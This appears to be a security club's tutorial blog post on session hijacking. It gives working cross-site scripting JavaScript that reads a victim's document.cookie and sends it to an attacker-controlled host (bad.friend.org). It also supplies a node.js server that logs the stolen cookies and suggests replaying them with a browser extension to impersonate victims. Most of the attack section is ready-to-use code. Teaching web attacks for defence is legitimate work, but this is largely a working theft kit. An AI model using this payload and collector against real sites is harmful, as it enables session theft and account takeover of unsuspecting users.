---
layout: post
title: Session Hijacking
subtitle: Week 19 - data theft over the Internet
tags: [web, node]
---

Previously, we have demonstrated how to use [ARP poison](https://github.com/twlinux/club/wiki/Man-in-the-Middle-(MitM)-Attack-%E2%80%93-ARP-Poisoning) attacks to compromise unencrypted communication on local area networks (LAN). The attacks described below are effective over HTTPS traffic from external networks.

<center>
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/T1QEs3mdJoc" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</center>

# Cookie Stealing

First, you must create an entry point on the vulnerable website with cross-site scripting. Force clients to establish a connection with your server.

## JavaScript Injection

For the code snippet below, we assume your server is accessible at the domain `bad.friend.org`. This is an example of an **AJAX** request, which is unlikely to be noticed by victims.

{% highlight javascript linenos %}

let yourCookie = encodeURI(document.cookie);
url = `http://bad.friend.org/gimmie?yourCookies=${yourCookie}`;

let xhr = new XMLHttpRequest();
xhr.open('GET', url, true);
xhr.send();

{% endhighlight %}

## Basic node.js Server

This is a minimal node.js server that prints HTTP request parameters to standard output.

{% highlight javascript linenos %}

const http = require('http');

http.createServer((req, res) => {

  let i = req.url.indexOf('?');
  if (i !== -1)
    console.log(req.connection.remoteAddress + ' ' + req.url.substring(i));

  res.end('thanks buddy\n');
}).listen(process.env.PORT || 8125);

{% endhighlight %}

You can impersonate victims by spoofing their unique cookie. The Chrome extension [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg) is easy to use.

## Alternative Approaches

Your situation might constrain the available options. More examples are available on [Github](https://github.com/twlinux/lets-talk/tree/master/examples).

